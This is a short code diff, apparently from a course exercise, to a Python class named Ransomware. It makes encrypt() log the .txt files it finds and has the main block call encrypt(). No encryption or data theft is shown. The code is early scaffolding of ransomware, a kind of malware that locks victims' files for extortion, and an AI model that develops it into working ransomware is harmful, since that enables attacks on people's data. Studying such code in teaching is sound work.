@@ -52,7 +52,7 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        self._log.info(ransomware.get_files("*.txt"))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
@@ -62,8 +62,7 @@ if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
-        ransomware._log.info(ransomware.get_files("*.txt"))
-        # ransomware.encrypt()
+        ransomware.encrypt()
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
